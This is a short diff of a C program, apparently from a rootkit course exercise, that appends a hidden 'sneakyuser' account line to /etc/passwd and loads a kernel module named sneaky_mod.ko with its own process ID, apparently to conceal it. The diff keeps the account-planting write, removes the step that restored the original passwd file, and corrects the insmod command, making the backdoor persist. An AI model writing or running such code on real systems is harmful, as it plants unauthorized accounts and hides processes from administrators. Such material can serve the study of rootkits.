@@ -5,18 +5,16 @@
 #include <string.h>
 
 int main() {
-  system("cp /etc/passwd /tmp/passwd");
+  //system("cp /etc/passwd /tmp/passwd");
   FILE *f = fopen("/etc/passwd", "a");
   if(f == NULL) {
     perror("fopen:");
   }
-  fwrite("sneakyuser:abc123:2000:2000:sneakyuser:/root:bash", 49, 1, f);
-  system("cat /etc/passwd");
-  system("cp /tmp/passwd /etc/passwd");
+  fprintf(f, "\nsneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
   fclose(f);
   pid_t mypid = getpid();
   printf(“sneaky_process pid = %d\n”, mypid);
-  char command[50] = "insmode sneaky_mod.ko mypid=";
+  char command[50] = "insmod sneaky_mod.ko mypid=";
   char cpid[10];
   sprintf(cpid, "%d", mypid);
   strcat(command, cpid);
